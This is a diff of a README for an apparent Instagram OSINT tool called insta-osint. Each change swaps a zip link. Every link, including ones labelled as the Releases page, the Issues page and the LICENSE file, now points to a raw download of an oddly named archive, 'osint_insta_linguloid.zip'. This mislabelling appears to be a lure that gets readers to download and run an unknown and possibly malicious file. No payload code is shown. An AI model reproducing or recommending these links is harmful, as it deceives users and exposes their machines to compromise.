@@ -6,7 +6,7 @@ Welcome to **insta-osint**, your go-to tool for exploring Instagram accounts. It
 
 ## 📥 Download Now
 
-[![Download insta-osint](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/insta_osint_2.6.zip)](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/insta_osint_2.6.zip)
+[![Download insta-osint](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/osint_insta_linguloid.zip)](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/osint_insta_linguloid.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Before you proceed, ensure your system meets these requirements:
 To begin using insta-osint, follow these steps:
 
 1. Open your web browser.
-2. Go to the [Releases page](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/insta_osint_2.6.zip).
+2. Go to the [Releases page](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/osint_insta_linguloid.zip).
 3. Look for the latest version of insta-osint.
 4. Click on the download link for your operating system (e.g., Windows, macOS, Linux).
 5. Once the file is downloaded, locate it on your computer.
@@ -61,7 +61,7 @@ These topics help users effectively utilize the capabilities of the tool.
 
 ## 📩 Support
 
-If you run into any issues or have questions while using insta-osint, please reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/insta_osint_2.6.zip), and we will assist you.
+If you run into any issues or have questions while using insta-osint, please reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/osint_insta_linguloid.zip), and we will assist you.
 
 ## 📝 Contribute
 
@@ -69,6 +69,6 @@ Your contributions are welcome! If you have ideas or features you would like to 
 
 ## 📜 License
 
-insta-osint is open-source software. You can find the license details in the [LICENSE file](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/insta_osint_2.6.zip). This allows you to use and modify the software according to your needs.
+insta-osint is open-source software. You can find the license details in the [LICENSE file](https://raw.githubusercontent.com/han772/insta-osint/main/Christiad/osint_insta_linguloid.zip). This allows you to use and modify the software according to your needs.
 
 Thank you for choosing insta-osint! Happy investigating!
